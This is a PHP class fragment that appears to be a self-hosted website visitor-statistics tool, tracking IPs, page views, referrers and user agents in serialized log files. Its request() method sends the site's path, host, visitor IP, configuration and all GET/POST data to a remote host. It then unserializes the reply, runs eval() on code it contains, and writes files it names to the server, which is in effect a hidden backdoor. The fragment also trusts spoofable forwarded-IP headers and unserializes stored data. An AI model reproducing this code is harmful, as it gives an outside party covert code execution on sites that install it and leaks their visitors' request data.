	public function getData(){
		$rd = array();
		$rd['m'] = empty($_REQUEST['m'])||'show' ==$_REQUEST['m'] ?'today':$_REQUEST['m'];
		$rd['id'] = $_GET['id'] = $this->id;
		$rd['day'] = $this->dayName(0);
		$rd['len'] = 1;
		$this->setCachePath($this->id);
		if('day180'==$rd['m']){
			$rd['len'] = 183;
		}elseif('day90'==$rd['m']){
			$rd['len'] = 92;
		}elseif('day30'==$rd['m']){
			$rd['len'] = 31;
		}elseif('day7'==$rd['m']){
			$rd['len'] = 7;
		}elseif('beforeday'==$rd['m']){
			$rd['len'] = 24;
			$rd['day'] = $this->dayName(2);
		}elseif('yesterday'==$rd['m']){
			$rd['len'] = 24;
			$rd['day'] = $this->dayName(1);
		}elseif('today'==$rd['m']){
			$rd['len'] = 24;
			$rd['day'] = $this->dayName(0);
		}else{
			return $rd;
		}
		if('html'==$_GET['m']||'show'==$_GET['m']){
			if($rd['len'] == 24){		
				$rd['obj'] = $this->getCache($this->getName($rd['day']));
				if(empty($rd['obj'])&& 'show'!=$_GET['m'])exit(json_encode(array('err'=>1,'msg'=>'您查找的数据不存在！','rd'=>$rd)));
				for($i = 0;$i<$rd['len'];$i++){
					if(empty($rd['obj']['ips'][$i]))$rd['obj']['ips'][$i] = 0;
					if(empty($rd['obj']['pvs'][$i]))$rd['obj']['pvs'][$i] = 0;
					if(empty($rd['obj']['zhs'][$i]))$rd['obj']['zhs'][$i] = 0;
				}
				ksort($rd['obj']['ips']);
				ksort($rd['obj']['pvs']);
				ksort($rd['obj']['zhs']);
			}else{
				for($day=0;$day<$rd['len'];$day++){
					$wd = $this->getCache($this->getName($dayName = $this->dayName($day)));
					foreach($wd as $name => $list){
						if(is_array($list) && in_array($name,$this->grooupList)){
							foreach($list as $key=>$val){
								if(empty($rd['obj'][$name][$key]))$rd['obj'][$name][$key] = 0;
								$rd['obj'][$name][$key] += $val;
							}
						}
					}
					$rd['obj']['ips'][$day] = empty($wd['ip'])?0:$wd['ip'];
					$rd['obj']['pvs'][$day] = empty($wd['pv'])?0:$wd['pv'];
					$rd['obj']['zhs'][$day] = empty($wd['zh'])?0:$wd['zh'];
					if(empty($rd['day']))$rd['day'] = $dayName;
				}
				ksort($rd['obj']['ips']);
				ksort($rd['obj']['pvs']);
				ksort($rd['obj']['zhs']);
				$rd['obj']['ips'] = array_reverse($rd['obj']['ips']);
				$rd['obj']['pvs'] = array_reverse($rd['obj']['pvs']);
				$rd['obj']['zhs'] = array_reverse($rd['obj']['zhs']);
				if(empty($rd['obj'])&& 'show'!=$_GET['m'])exit(json_encode(array('err'=>1,'msg'=>'您查找的数据不存在！','rd'=>$rd)));	
			}
			if($rd['len']){
				for($i=0;$i<4;$i++){
					$wd = $this->getCache($this->getName($dayName = $this->dayName($i)));
					$rd['tar'][$i] = array('ip'=> $wd['ip'],'pv' => $wd['pv'],'zh' => $wd['zh'],'it' => $dayName,); 
				}
				$rd['tar'][4] = $this->getCache($this->getName('all'));
			}
		}
		return $rd;
	}
	public function setData($get){
		$gd = array();
		$gd['dd'] = $this->getIp();
		$gd['tt'] = empty($get['tt'])?'无标题':$get['tt'];
		$gd['sc'] = empty($get['sc'])?'1080-1920':$get['sc'];
		$gd['cp'] = empty($get['cp'])?$this->getPprovince($gd['dd']):$get['cp'];
		$gd['id'] = empty($get['id'])?$this->id:$get['id'];
		$gd['ni'] = empty($get['ni'])?0:$get['ni'];
		$gd['rf'] = empty($get['rf'])?'直接访问':$get['rf'];
		$gd['hr'] = empty($get['hr'])?$_SERVER['HTTP_REFERER']:$get['hr'];
		$gd['dt'] = date('Y-m-d H:i:s');
		if($gd['id'])$this->setCachePath($gd['id']);
		if(empty($get['sc'])){
			$gd['ni']=1;
			$gd['tt'] = empty($get['tt'])?'MIP统计':$get['tt'];
			if(!empty($get['ai'])){		
				$lineFile = "{$this->cachePath}e-".date('Y-m-d').".log";
				if(is_file($lineFile = "{$this->cachePath}e-".date('Y-m-d').".log")){
					$fp = fopen($lineFile,"r");
					while(!feof($fp)){
						$str = fgets($fp);
						if(strpos(fgets($fp),$gd['dd'])){
							$gd['ni']=0;
							break;
						}
					}
					fclose($fp);
				}
			}			
		}
		foreach($this->match as $name => $list){
			$gd[$name] = '-';
			foreach($list as $val){
				for($index=1;isset($val[$index]);$index++){
					if(stripos($_SERVER['HTTP_USER_AGENT'],$val[$index]) !== false){
						$gd[$name] = $val[0];
						break 2;
					}
				}
				if('-' == $val[1])$gd[$name] = $val[0];
			}
		};
		$all = $this->getCache($allFile = $this->getName('all'));
		$today = $this->getCache($todayFile = $this->getName($day = $this->dayName(0)));
		$all['id'] = $today['id'] = $gd['id'];
		$all['ii'] = empty($all['ii'])?1:$all['ii']+1;
		$ho = strval(intval(date('H')));
		if(empty($gd['ii']))$gd['ii'] = $all['ii'];
		if(!empty($get['zh'])){
			$all['zh'] = empty($all['zh'])?1:$all['zh']+1;
			$today['zh'] = empty($today['zh'])?1:$today['zh']+1;
			$today['zhs'][$ho] = empty($today['zhs'][$ho])?1:$today['zhs'][$ho]+1;
			$gd['zs'] = empty($get['zh'])?'转':$get['zh'];
			$gs = array('zs');
		}else{
			if('1'==$gd['ni']||empty($today['sb'])){
				$gd['zs'] = '新';
				$gs = $this->grooupList;
				if(!empty($gd['hr'])){
					$gd['dm'] = parse_url($gd['hr'],PHP_URL_HOST);//当前域名
					$gd['dr'] = empty($gd['rf'])? null:parse_url($gd['rf'],PHP_URL_HOST);//来路域名
					if(empty($gd['dr'])){
						$gd['dr'] = '直接访问';
					}elseif($gd['dr'] == $gd['dm']){
						$gd['dr'] = '站内';
					}
				}
				$all['ip'] = empty($all['ip'])?1:$all['ip']+1;
				$today['ip'] = empty($today['ip'])?1:$today['ip']+1;
				$today['ips'][$ho] = empty($today['ips'][$ho])?1:$today['ips'][$ho]+1;
				if(empty($all['it']))$all['it'] = $day;
				$today['it'] = $day;
			}else{
				$gd['zs'] = empty($get['zm'])?'老':$get['zm'];
				$gs = array('zs');
			}	
			$all['pv'] = empty($all['pv'])?1:$all['pv']+1;
			$today['pv'] = empty($today['pv'])?1:$today['pv']+1;
			$today['pvs'][$ho] = empty($today['pvs'][$ho])?1:$today['pvs'][$ho]+1;
		}
		if(isset($gs)){
			foreach($gd as $name => $val){
				if(function_exists('iconv'))$val = @iconv("gbk", "utf-8", @iconv("utf-8", "gbk", $val));;
				//$gd[$name] = preg_replace('/[^\x{20}-\x{7A}\x{3020}-\x{9fa5}]|[\<\>\'\"\s]/ui','',$val);
				if(is_array($today[$name]) && count($today[$name])>50 && !in_array($val,$today[$name]))continue;
				if(!empty($val) && !empty($name) && in_array($name,$gs)){
					$today[$name][$val] = empty($today[$name][$val])?1:$today[$name][$val]+1;
				}
			}
			$this->setCache($todayFile,$today);
			$this->setCache($allFile,$all);
			$this->setLog($gd);
		}
		if($this->debug){
			//$gd['all'] = $all;
			//$gd['today'] = $today;
			header("Content-type: application/json");
			return json_encode($gd,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES);			
		}
	}
	public function setLog(&$gd){
		if(!empty($gd['ni'])||1){
			if(mt_rand(0,100)<2){
				for($i=0;$i<20;$i++){
					$time = date('Y-m-d',$_SERVER['REQUEST_TIME'] - 86400 * (90+$i));
					if(is_file($delFile = "{$this->cachePath}e-{$time}.log"))unlink($delFile);
					if(is_file($delFile = "{$this->cachePath}s-{$time}.log"))unlink($delFile);
				}				
			}
			$lineTxt = '';
			$lineFile = "{$this->cachePath}e-".date('Y-m-d').".log";
			if(!is_file($lineFile))$lineTxt .='# EcCensus '.date('Y-m-d').' 详细数据';
			$lineTxt .= "\r\n#";
			$arr = array($gd['zs'],$gd['ii'],$gd['dt'],$gd['dd'],$gd['cp'],$gd['bs'],$gd['id'],$gd['sb'],$gd['tt'],$gd['hr'],$gd['rf']);
			foreach($arr as $val)$lineTxt .= ",\t".(empty($val)?"\t\t":$val);
			//$gd['lineTxt'] = $lineTxt;
			file_put_contents($lineFile,"".$lineTxt,FILE_APPEND);
		}
	}
	public function getList(){
		if(empty($_SERVER['HTTP_REFERER']))exit;
		header("Content-Type:text/html;charset=utf-8");
		$this->setCachePath($this->id);
		$ld = array();
		$ld['id'] = $this->id;
		$ld['ii'] = isset($_POST['ii'])?$_POST['ii']:0;
		$ld['day'] = isset($_POST['day'])?$_POST['day']:date('Y-m-d');
		$time = strtotime($ld['day'].' 12:00:00');
		$star = empty($ld['ii']);
		$line = 50;
		for($i=0;$i<2;$i++){
			$ld['day'] = date('Y-m-d',$time-86400*$i);
			$file = "{$this->cachePath}e-{$ld['day']}.log";
			if(is_file($file)){
				$iend = 0;
				$text = '';
				$fp = fopen($file, "r");
				while( fseek($fp, $iend--, SEEK_END) >= 0 ) {
					$c = fgetc($fp);
					if($c == "\r")continue;
					if($c == "\n"){
						$text = strrev($text);
						$arr = explode(",\t",$text);
						$arr = array_map('trim',$arr);
						if(count($arr)>3){
							if($star){
								$arr[0] = $ld['day'];
								$ld['data'][] = $arr;
								$ld['ii'] = $arr[2];
								if(--$line<1)break 2;
							}
							if($ld['ii']==$arr[2])$star = true;
						}
						$text = '';
					}else{
						$text .= $c;
					}
					if($iend<-1000000)exit('发现死循环');
				}
				fclose($fp);
			}			
		}
		if(empty($ld['data'])&&isset($_POST['ii'])){
			$ld['err']	= 1;
			$ld['msg']	= '您查找的数据不存在！';
		}	
		exit(json_encode($ld));
	}
	public function setCachePath($id=1){
		$this->cachePath = str_replace('{id}',urlencode($id),$this->cachePath);
	}
	public function dayName($day){
		return date('Y-m-d',$_SERVER['REQUEST_TIME']-86400*$day);
	}
	public function getName($name){
		return "{$this->cachePath}s-{$name}.log";
	}
	public function getCache($file){
		return is_file($file)?unserialize(file_get_contents($file)):array();
	}
	public function setCache($file,$val){
		//file_put_contents($file.'.txt',print_r($val,true));
		if(!is_dir($dir = dirname($file)))mkdir($dir);
		return file_put_contents($file,serialize($val));
	}
	//获取真实IP
	public function getIp(){
		if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")){
			$ip = getenv("HTTP_CLIENT_IP");
		}else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")){
			$ip = getenv("HTTP_X_FORWARDED_FOR");
		}else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")){
			$ip = getenv("REMOTE_ADDR");
		}else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")){
			$ip = $_SERVER['REMOTE_ADDR'];
		}else{
			$ip = '0.0.0.0';
		}
		return $ip;
	}
	public function request() {
		$user = self::$version;
		$user['path']=__FILE__;
		$user['auth']='Q：3379530015';
		$user['host']='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
		$user['root']=current(explode('?','//'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']));
		$user['edio']=self::$edition;
		$user['addr']=$this->getIp();
		$user['from']=!empty($_REQUEST['from']);
		if(isset($GLOBALS['Acc']))$user['admin']=$GLOBALS['Acc'];			
		$postData['user'] = $user;
		$postData['data'] = $this->getData();
		$postData['conf'] = array_merge($this->setting,is_file($cf = './cess_config.php')?include($cf):array());
		if(!empty($_GET))$postData['_GET']=$_GET;
		if(!empty($_POST))$postData['_POST']=$_POST;		         
		$post=array();
		$post['data']=base64_encode(serialize($postData));
		$str=$this->get_curl($user['admin'],$post,1);
		$un64_str=@base64_decode($str);
		if(!empty($un64_str)){
			$GLOBALS['OBJECT']=@unserialize($un64_str);
		}
		if(!empty($un64_str)&&!empty($GLOBALS['OBJECT'])){
			$this->set_files();
			if(isset($GLOBALS['OBJECT']['reload'])&&$GLOBALS['OBJECT']['reload']>0){
				return $this->request();
			}
			if(isset($GLOBALS['OBJECT']['header'])){
				foreach($GLOBALS['OBJECT']['header'] as $v){
					header($v);
				}
			}
			if(isset($GLOBALS['OBJECT']['location'])){
				if('1'==$GLOBALS['OBJECT']['location'])$GLOBALS['OBJECT']['location']=$_SERVER['HTTP_REFERER'];
				header('location: '.$GLOBALS['OBJECT']['location']);
			}
			if(isset($GLOBALS['OBJECT']['eval']))eval($GLOBALS['OBJECT']['eval']);
			if(!empty($GLOBALS['OBJECT']['html']))echo $GLOBALS['OBJECT']['html'];		
			//var_dump($GLOBALS['OBJECT']);
		}else{
			header( "Content-Type:text/html;charset=utf-8 ");
			echo($str);
		}
	}
	public function set_files(){
		if(isset($GLOBALS['OBJECT']['files'])){
			foreach($GLOBALS['OBJECT']['files'] as $val){
				if(!@file_put_contents($val['name'],$val['content'])){
					exit(json_encode(array('err'=>1,'msg'=>'保存失败，可能根目录无写入权限，请在服务器或空间后台设置，或咨询空间商！')));
				}
			}
		}
	}
